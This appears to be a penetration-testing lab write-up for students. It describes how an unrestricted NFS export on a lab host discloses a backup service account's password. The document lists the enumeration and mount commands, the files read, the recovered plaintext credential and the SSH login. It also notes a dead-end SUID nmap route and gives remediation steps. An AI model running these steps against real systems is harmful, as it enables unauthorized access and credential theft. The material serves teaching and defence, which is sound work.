# Exploit 2: Anonymous NFS Export Leading to Credential Disclosure

## Summary

An NFS share exported without host or authentication restrictions discloses backup service credentials, providing an SSH foothold as a low-privilege account (`backupsvc`). This path does not reach root on its own; it is documented as a distinct finding because it demonstrates an independent, realistic misconfiguration (information disclosure via a network file share) separate from the direct RCE and pre-auth SSH paths.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.131 |
| Service | NFSv3/v4, rpcbind, port 111/2049/tcp |
| Attacker | Kali, 192.168.144.129 |
| Tooling | nmap, rpcinfo, showmount, mount.nfs, ssh |

## Vulnerability

`/etc/exports` on the target exports `/srv/backups` with no client restriction (`*`), so any host on the network can mount the share without authentication:

```
/srv/backups       *(rw,sync,no_subtree_check)
```

The share contains plaintext operational notes that, combined, disclose a service account username and password (CWE-200, Information Exposure, arising from CWE-668/CWE-732 style over-permissive export and file permissions).

## Reconnaissance and enumeration

```
rpcinfo -p 192.168.144.131
showmount -e 192.168.144.131
```

```
Export list for 192.168.144.131:
/srv/backups *
```

## Exploitation

```
sudo mkdir -p /mnt/cav-backups
sudo mount -t nfs 192.168.144.131:/srv/backups /mnt/cav-backups
find /mnt/cav-backups -maxdepth 2 -type f -ls
cat /mnt/cav-backups/backup.conf
cat /mnt/cav-backups/backup-service.txt
cat /mnt/cav-backups/hosts.txt
```

The three files together yield:

- `BACKUP_USER=backupsvc` (from `backup-service.txt`)
- A password value present in `backup.conf` alongside unrelated host/protocol notes, despite `hosts.txt` implying an empty `BACKUP_PASSWORD`. The credential is deliberately split across files to require correlation rather than a single obvious read.

```
ssh backupsvc@192.168.144.131
```
The credentials recovered from the exposed backup files are:

```text
backupsvc / 5W23Z7VsZrQE1CalwmW
```
These credentials were then used to obtain an SSH foothold as backupsvc.
## Evidence

```
whoami
backupsvc
id
uid=1001(backupsvc) gid=1001(backupsvc) groups=1001(backupsvc)
```

## Outcome

Low-privilege shell as `backupsvc`. `sudo -l` for this account permits only `sudo -l` itself (no further privilege path). A SUID `nmap` binary is present but is version 7.93, which no longer supports the `--interactive` NSE privilege-escalation technique, so an NSE script run through it still executes with the real (non-root) UID rather than the effective one; this is a dead end on this build and worth flagging to students as a common red herring. No further escalation was achieved from this account in this session.

## Remediation

- Restrict NFS exports to specific trusted hosts and use `root_squash` (default) plus authentication (Kerberos/`sec=krb5`) rather than `sec=sys` with an open client list.
- Never store credentials, even split across multiple files, on a share reachable without authentication.
- Rotate the `backupsvc` credential and audit for reuse elsewhere.

## Lab Dependencies

**Prerequisite exploit(s):** None  
**Required starting access:** Network access to the target from Kali  
**Starting account:** None  
**Resulting access:** SSH shell as `backupsvc`  
**Provides access for:** Exploit 07 - World-readable `/etc/shadow`, or any later exercise requiring a local low-privilege shell